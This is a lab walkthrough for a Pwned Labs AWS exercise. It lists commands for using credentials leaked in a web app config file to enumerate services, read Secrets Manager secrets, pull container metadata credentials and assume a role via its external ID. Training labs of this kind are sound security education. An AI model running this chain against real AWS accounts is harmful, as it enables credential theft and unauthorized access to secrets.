## LAB URL:

https://pwnedlabs.io/labs/assume-privileged-role-with-external-id

<img width="1920" height="1985" alt="image" src="https://github.com/user-attachments/assets/96c56a8d-2740-42a8-9144-3b0adc98ec13" />

## Solution

Web App
AWS Config file (/config.json)
S3 credentials (AccessKeyID + secretAccessKey + Region)
	aws configure
	aws-enumerator creds
	aws sts get-caller-identity
Exposed aws services (Secret manager)
	aws-enumerator enum -services all
	aws-enumerator dump -services <service>
Extract credential of user (ext/cost-optimization)
	aws secretsmanager list-secrets --query 'SecretList[*].[Name, Description, ARN]' --output json
	aws secretsmanager get-secret-value --secret-id ext/cost-optimization
AWS CLI Credentials (using cloud shell)
	TOKEN=$(curl -X PUT localhost:1338/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
	curl localhost:1338/latest/meta-data/container/security-credentials -H "X-aws-ec2-metadata-token: $TOKEN"
Policies attached to this user
	aws iam list-attached-user-policies --user-name ext-cost-user
	aws iam get-policy --policy-arn arn:aws:iam::427648302155:policy/ExtPolicyTest
	aws iam get-policy-version --policy-arn arn:aws:iam::427648302155:policy/ExtPolicyTest --version-id v4
Roles attached to a policy attached to this user (Ressources: "arn:aws:iam::427648302155:role/ExternalCostOpimizeAccess") -> 
	aws iam get-role --role-name ExternalCostOpimizeAccess
		 "Effect": "Allow",
                    "Principal": {
                        "AWS": "arn:aws:iam::427648302155:user/ext-cost-user"
                    },
                    "Action": "sts:AssumeRole",
                    "Condition": {
                        "StringEquals": {
                            "sts:ExternalId": "37911"
                        }
                    }
Policies attached to this role
	aws iam list-attached-role-policies --role-name ExternalCostOpimizeAccess
	aws iam get-policy --policy-arn arn:aws:iam::427648302155:policy/Payment
		"Action": [
                        "secretsmanager:GetSecretValue",
                        "secretsmanager:DescribeSecret",
                        "secretsmanager:ListSecretVersionIds"
                    ],
		"Resource": "arn:aws:secretsmanager:us-east-1:427648302155:secret:billing/hl-default-payment-xGmMhK"
Assume role 
	aws sts assume-role --role-arn arn:aws:iam::427648302155:role/ExternalCostOpimizeAccess --role-session-name ExternalCostOpimizeAccess --external-id 37911
	aws sts get-caller-identity
	aws secretsmanager list-secrets --query 'SecretList[*].[Name, Description, ARN]' --output json
	aws configure
	aws-enumerator creds
	

